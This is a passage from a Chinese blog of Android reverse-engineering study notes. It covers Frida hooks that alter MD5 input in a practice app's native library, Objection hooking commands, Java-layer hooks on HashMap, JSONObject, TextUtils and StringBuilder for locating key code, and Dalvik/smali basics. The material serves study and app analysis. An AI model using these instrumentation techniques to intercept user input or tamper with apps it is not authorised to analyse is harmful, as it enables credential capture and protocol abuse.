class="string">&quot;xiaojianbang&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">let</span> newStr = <span class="string">&quot;jianbang&quot;</span>;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">args0</span>.<span class="title function_">add</span>(<span class="number">24</span>).<span class="title function_">writeByteArray</span>(<span class="title function_">stringToBytes</span>(newStr));</span><br><span class="line"><span class="comment">//这个add(24)是因为MD5_CTX结构体前8个字节用于记录原始明文的bit长度，后16个字节是初始化的魔数，所以从第24个字节后就是用writeByteArray写入明文数据等一系列操作</span></span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">hexdump</span>(<span class="variable language_">this</span>.<span class="property">args0</span>.<span class="title function_">writeInt</span>(newStr.<span class="property">length</span> * <span class="number">8</span>)));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">7fda079f08  40 00 00 00 00 00 00 00 01 23 45 67 89 ab cd ef  @........#Eg....</span></span><br><span class="line"><span class="comment">7fda079f18  fe dc ba 98 76 54 32 10 6a 69 61 6e 62 61 6e 67  ....vT2.jianbang</span></span><br><span class="line"><span class="comment">7fda079f28  62 61 6e 67 00 00 00 00 d0 a0 07 da 7f 00 00 00  bang............</span></span><br><span class="line"><span class="comment">7fda079f38  78 b2 2f 3e 7b 00 00 00 4c b2 2f 3e 7b 00 00 00  x./&gt;&#123;...L./&gt;&#123;...</span></span><br><span class="line"><span class="comment">7fda079f48  00 00 00 00 00 00 00 00 06 00 00 00 00 00 00 00  ................</span></span><br><span class="line"><span class="comment">7fda079f58  63 01 63 01 00 00 00 00 10 00 00 00 10 00 00 00  c.c.............</span></span><br><span class="line"><span class="comment">//logcat中的输出结果</span></span><br><span class="line"><span class="comment">//CMD5 md5Result: ea54ded1bd8a592dd826fb919687f13f</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> <span class="title class_">MD5Update</span> = <span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="string">&quot;libxiaojianbang.so&quot;</span>, <span class="string">&quot;_Z9MD5UpdateP7MD5_CTXPhj&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> newStr = <span class="string">&quot;xiaojianbang&amp;liruyi&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> newStrAddr = <span class="title class_">Memory</span>.<span class="title function_">allocUtf8String</span>(newStr);</span><br><span class="line"><span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(<span class="title class_">MD5Update</span>, &#123;</span><br><span class="line">    <span class="attr">onEnter</span>: <span class="keyword">function</span> (<span class="params">args</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(args[<span class="number">1</span>].<span class="title function_">readCString</span>() == <span class="string">&quot;xiaojianbang&quot;</span>)&#123;</span><br><span class="line">            args[<span class="number">1</span>] = newStrAddr;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">hexdump</span>(args[<span class="number">1</span>]));</span><br><span class="line">            args[<span class="number">2</span>] = <span class="title function_">ptr</span>(newStr.<span class="property">length</span>);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(args[<span class="number">2</span>].<span class="title function_">toInt32</span>());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;, <span class="attr">onLeave</span>: <span class="keyword">function</span> (<span class="params">retval</span>) &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">7b34a80060  78 69 61 6f 6a 69 61 6e 62 61 6e 67 26 6c 69 72  xiaojianbang&amp;lir</span></span><br><span class="line"><span class="comment">7b34a80070  75 79 69 00 00 00 00 00 23 00 00 00 00 00 00 00  uyi.....#.......</span></span><br><span class="line"><span class="comment">19</span></span><br><span class="line"><span class="comment">//logcat中的输出结果</span></span><br><span class="line"><span class="comment">//CMD5 md5Result: 8f1968f06a1e62bb3d83119352cc26cc</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<p>readCString是NativePointer的方法，读取C字符串，返回JavaScript的string类型的字符串，可以传入一个参数作为指定读取的字节数，没有的话就读到结束标识符”\0”</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://2298233831.github.io/2022/10/24/Objection/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Yu4n">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="The Blog of Yu4n">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/10/24/Objection/" class="post-title-link" itemprop="url">Objection</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-10-24 14:03:58" itemprop="dateCreated datePublished" datetime="2022-10-24T14:03:58+08:00">2022-10-24</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2025-10-14 23:23:22" itemprop="dateModified" datetime="2025-10-14T23:23:22+08:00">2025-10-14</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Reverse/" itemprop="url" rel="index"><span itemprop="name">Reverse</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="Objection"><a href="#Objection" class="headerlink" title="Objection"></a>Objection</h1><p>常用命令</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">android hooking search classes 关键字 <span class="comment">#(关键字可选，最后的classes是可替换为其他东西的，如methods)</span></span><br><span class="line">android hooking list class_methods &lt;路径.类名&gt; <span class="comment">#(同样可替换，例如activity</span></span><br><span class="line">android hooking list classes <span class="comment">#列出所有已加载的类</span></span><br><span class="line">对指定方法进行hook ： android hooking watch class_method &lt;路径.类名.方法名&gt; <span class="comment">#(这个命令可以在后面加参数)</span></span><br><span class="line">对指定类的所有函数hook ：android hooking watch class 类名</span><br><span class="line">Hook类的所有方法(不含构造方法)：android hooking watch class &lt;路径.类名&gt;</span><br><span class="line">Hook类的所有构造方法： android hooking watch class_method &lt;路径.类名.<span class="variable">$init</span>&gt;</span><br><span class="line">Hook方法的所有重载: android hooking watch class_method &lt;路径.类名.方法名&gt;</span><br><span class="line">Hook方法的参数，返回值和调用栈: android hooking watch class_method &lt;路径.类名.方法名&gt; --dump-args --dump-return --dump-backtrace</span><br><span class="line">查看Hook了多少个类:<span class="built_in">jobs</span> list</span><br><span class="line">取消Hook:<span class="built_in">jobs</span> <span class="built_in">kill</span> &lt;taskID&gt;</span><br><span class="line">搜索堆中的实例: android heap search instances &lt;类名&gt;</span><br><span class="line">在应用启动之前就Hook: objection -g &lt;进程名&gt; explore --startup-command <span class="string">&quot;android hooking watch class &#x27;&lt;路径.类名&gt;&#x27; &quot;</span></span><br></pre></td></tr></table></figure>
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://2298233831.github.io/2022/10/24/Java%E5%B1%82Hook/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Yu4n">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="The Blog of Yu4n">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/10/24/Java%E5%B1%82Hook/" class="post-title-link" itemprop="url">Java层Hook</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-10-24 14:03:21" itemprop="dateCreated datePublished" datetime="2022-10-24T14:03:21+08:00">2022-10-24</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2025-10-14 23:26:14" itemprop="dateModified" datetime="2025-10-14T23:26:14+08:00">2025-10-14</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Reverse/" itemprop="url" rel="index"><span itemprop="name">Reverse</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="Java层Hook"><a href="#Java层Hook" class="headerlink" title="Java层Hook"></a>Java层Hook</h1><ol>
<li><p>脚本编写：</p>
<p> 先用Java.use定位到类，定位类使用的所属的package.类名的方式，之后可以通过implementation方法直接覆写静态方法。另外，再次强调，hook的代码的函数的参数，只需要数量上与原型相同，类型可不做要求。</p>
</li>
<li><p>几个常用的frida框架命令行参数：</p>
<p> -U:链接USB设备。</p>
<p> -F:附加最前面的应用。</p>
<p> -f:主动启动进程。</p>
<p> -l:加载script脚本文件</p>
<p> -o:输出日志。</p>
<p> —no-pauese:启动主线程运行应用。</p>
</li>
<li><p>基本上new 后面跟随的都是构造方法。</p>
</li>
<li><p>在js脚本中，使用$init来指代构造方法的名字。</p>
</li>
<li><p>中间遇到几次什么main thread 什么的，导致注入失败，目前原因不明，过了几天就能注入了，离谱。</p>
</li>
<li><p>迟来的脚本注入命令：</p>
</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">frida -U -F 进程名 -l xxx.js    //使用-U 是不需要进行端口转发的，-R才需要的.</span><br><span class="line">//然后由于frida在15.2.2之后，默认app在启动时不再暂停，所以--no-pause参数没用了，想让程序暂停，将--no-pause替换为--pause即可</span><br><span class="line">//-F是附加启动，后跟进程名，-f是spawn方式启动，后跟包名</span><br></pre></td></tr></table></figure>

<p><strong>从这开始是关键代码快速定位：</strong></p>
<ol>
<li>showStacks()显示函数调用栈，主要使用的是Log类的getStackTraceString方法。</li>
</ol>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">showStacks</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;android.util.Log&quot;</span>).<span class="title function_">getStackTraceString</span>(<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.Throwable&quot;</span>).$new()));</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//调用的时候最好做个过滤，防止崩溃.</span></span><br></pre></td></tr></table></figure>

<ol>
<li>app处理，提交数据通常会将数据放在集合中，HashMap又是这其中最为常用的。</li>
</ol>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> hashMap = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.util.HashMap&quot;</span>);</span><br><span class="line">hashMap.<span class="property">put</span>.<span class="property">implementation</span>=<span class="keyword">function</span>(<span class="params">a,b</span>)&#123;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;HashMap.put&quot;</span>,a,b);</span><br><span class="line"><span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">put</span>(a,b);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol>
<li>Hook Toast</li>
</ol>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> toast = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;android.widget.Toast&quot;</span>);</span><br><span class="line">toast.<span class="property">show</span>.<span class="property">implementation</span>=<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title function_">showstacks</span>();</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Toast.show&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">show</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">showstacks</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;android.util.Log&quot;</span>).<span class="title function_">getStackTraceString</span>(<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.Throwable&quot;</span>).$new()));</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol>
<li>Hook 组件（按钮，输入框那些,此处以登录按钮为例）</li>
</ol>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> btn_login_id=<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.dodonew.online.R$id&quot;</span>).<span class="property">btn_login</span>.<span class="property">value</span>;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;btn_lgin_id&quot;</span>,btn_login_id);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<ol>
<li>Hook用户输入</li>
</ol>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> textUtils = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;android.text.TextUtils&quot;</span>);</span><br><span class="line">textUtils.<span class="property">isEmpty</span>.<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">a</span>) &#123;</span><br><span class="line">    <span class="title function_">showStacks</span>();</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;TextUtils.isEmpty: &quot;</span>, a);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">isEmpty</span>(a);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>据说在协议分析中，客户端与服务端进行数据交换时，通常会使用JSON数据作为中间数据进行交互。通常会用到一些JSON类，如JSONObject,Gson等。后者用的相对较多，且可以被混淆。</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> jSONObject = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;org.json.JSONObject&quot;</span>);</span><br><span class="line">jSONObject.<span class="property">put</span>.<span class="title function_">overload</span>(<span class="string">&#x27;java.lang.String&#x27;</span>, <span class="string">&#x27;java.lang.Object&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">a, b</span>) &#123;</span><br><span class="line">    <span class="title function_">showStacks</span>();</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;JSONObject.put: &quot;</span>, a, b);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">put</span>(a, b);</span><br><span class="line">&#125;</span><br><span class="line">jSONObject.<span class="property">getString</span>.<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">a</span>) &#123;</span><br><span class="line">    <span class="title function_">showStacks</span>();</span><br><span class="line">    <span class="keyword">var</span> result = <span class="variable language_">this</span>.<span class="title function_">getString</span>(a);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;JSONObject.getString: &quot;</span>, a, result);</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>Hook StringBuilder</strong></p>
<p>Java中，字符串是只读的，对字符串进行修改，拼接等操作都是会创建新的字符串来返回</p>
<p>当有大量的字符串操作时，一般都会用到StringBuilder，Hook其toString方法来定位关键字符串。</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> stringBuilder = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.StringBuilder&quot;</span>);</span><br><span class="line">    stringBuilder.<span class="property">toString</span>.<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> result = <span class="variable language_">this</span>.<span class="property">toString</span>.<span class="title function_">apply</span>(<span class="variable language_">this</span>, <span class="variable language_">arguments</span>);</span><br><span class="line">        <span class="keyword">if</span>(result == <span class="string">&quot;username=13866668888&quot;</span>)&#123;</span><br><span class="line">            <span class="title function_">showStacks</span>();</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;stringBuilder.toString is called!&quot;</span>, result);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">showStacks</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;android.util.Log&quot;</span>).<span class="title function_">getStackTraceString</span>(<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.Throwable&quot;</span>).$new()));</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><a href="Java%E5%B1%82Hook%20ea69664cdcf241ff980d30f172207ac2/MD5%20Hook%20691c419c7c734a8aa7b0bc12794bfdad.md">MD5 Hook</a></p>
<p><a href="Java%E5%B1%82Hook%20ea69664cdcf241ff980d30f172207ac2/MAC%20Hook%20749b403bc6fd48e7baa3eaac5461f4a2.md">MAC Hook</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://2298233831.github.io/2022/10/24/Frida/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Yu4n">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="The Blog of Yu4n">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/10/24/Frida/" class="post-title-link" itemprop="url">Frida</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-10-24 14:03:01" itemprop="dateCreated datePublished" datetime="2022-10-24T14:03:01+08:00">2022-10-24</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2025-10-14 23:23:22" itemprop="dateModified" datetime="2025-10-14T23:23:22+08:00">2025-10-14</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Reverse/" itemprop="url" rel="index"><span itemprop="name">Reverse</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="Frida"><a href="#Frida" class="headerlink" title="Frida"></a>Frida</h1><p>参照安卓应用安全实战和frida实战。</p>
<p><a href="Frida%2094cfbf1a3f29407193f0a7ac11579935/Java%E5%B1%82Hook%20ea69664cdcf241ff980d30f172207ac2.md">Java层Hook</a></p>
<p><a href="Frida%2094cfbf1a3f29407193f0a7ac11579935/So%E5%B1%82Hook%209847d7a75c1340b0872681eb00f56807.md">So层Hook</a></p>
<p><a href="Frida%2094cfbf1a3f29407193f0a7ac11579935/JNI%E5%87%BD%E6%95%B0%E7%9A%84Hook%E4%B8%8E%E5%BF%AB%E9%80%9F%E5%AE%9A%E4%BD%8D%20153b403363c34d50bd0b8c3be2b85b9b.md">JNI函数的Hook与快速定位</a></p>
<p><a href="Frida%2094cfbf1a3f29407193f0a7ac11579935/Frida%20so%E5%B1%82%E8%BF%9B%E9%98%B6%E5%BA%94%E7%94%A8%20a3f9254256284475bc63148c42e8b6e8.md">Frida so层进阶应用</a></p>
<p><a href="Frida%2094cfbf1a3f29407193f0a7ac11579935/Objection%20eabad259d0f240e08ad535e7b1606ad9.md">Objection</a></p>
<p>示例app</p>
<p>链接：<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1vi6SsPjtzunM9GbZkzyDlw?pwd=GAME">https://pan.baidu.com/s/1vi6SsPjtzunM9GbZkzyDlw?pwd=GAME</a><br>提取码：GAME</p>
<p><a href="Frida%2094cfbf1a3f29407193f0a7ac11579935/%E4%B8%80%E4%BA%9B%E5%85%B6%E4%BB%96%E7%9A%84%20271df321b36a4f9c84a57501d1b6f41e.md">一些其他的</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://2298233831.github.io/2022/06/30/Dalvik-smali%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Yu4n">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="The Blog of Yu4n">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/06/30/Dalvik-smali%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="post-title-link" itemprop="url">Dalvik,smali学习笔记</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-06-30 17:11:18" itemprop="dateCreated datePublished" datetime="2022-06-30T17:11:18+08:00">2022-06-30</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2025-10-14 23:23:22" itemprop="dateModified" datetime="2025-10-14T23:23:22+08:00">2025-10-14</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Reverse/" itemprop="url" rel="index"><span itemprop="name">Reverse</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="Dalvik-smali学习笔记"><a href="#Dalvik-smali学习笔记" class="headerlink" title="Dalvik,smali学习笔记"></a>Dalvik,smali学习笔记</h1><h2 id="基础了解"><a href="#基础了解" class="headerlink" title="基础了解"></a>基础了解</h2><p>说到smali(对Dalvik虚拟机字节码的一种解释)，首先应该提一下Google专门为Android平台涉及的用于运行Android程序的虚拟机–Dalvik虚拟机</p>
<p>Dalvik与Jvm主要在字节码是有差别。</p>
<p>在程序运行时，Jvm会频繁对栈进行操作，而Dalvik则是对寄存器</p>
<p>用一组各自的字节码做对比</p>
<p>这是原程序（通过异或交换两个数的值）</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">math</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">int</span> a=<span class="number">5</span>,b=<span class="number">3</span>,c=a^b;</span><br><span class="line">        a=c^a;</span><br><span class="line">        b=c^b;</span><br><span class="line">        System.out.println(a);</span><br><span class="line">        System.out.println(b);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Jvm下的字节码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javap -c -classpath . math.class</span><br></pre></td></tr></table></figure>

<img src="/2022/06/30/Dalvik-smali%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220629214610348.png" class="" title="image-20220629214610348">

<p>重点看main函数的代码：</p>
<p>可以看到，Jvm的字节码明显要比Dalvik的字节码复杂iconst_5表示申明一个整型常量5，istore_0表示栈顶int数值存入第1局部变量，等…</p>
<p>Dalvik下的字节码（此图不准确，请看下面的smali）</p>
<p>(该工具通常在Android SDK的build-tools目录下，使用的时候需要注意jdk版本问题，写这文章的时候用的jdk18，不能成功执行下面的命令，换成jdk8或者其他版本就行)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dx --dex --output=math.dex math.class</span><br><span class="line">如果用的是d8.bat则用d8 --ouput 指定文件夹名称 math.class</span><br><span class="line">dexdump -d math.dex</span><br></pre></td></tr></table></figure>

<img src="/2022/06/30/Dalvik-smali%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/QQ%E5%9B%BE%E7%89%8720220630093607.png" class="">

<p>smali一般的指令格式为： [op]-[type] (可选) &#x2F; [位宽，默认4位] [目标寄存器], [源寄存器] (可选)</p>
<p>诸多命令可以到这篇文章查找</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/jiayanhui2877/article/details/41008985">(41条消息) 【Android安全】Dalvik字节码含义查询表_Walter_Jia的博客-CSDN博客</a></p>
<p>也或者是官方文档</p>
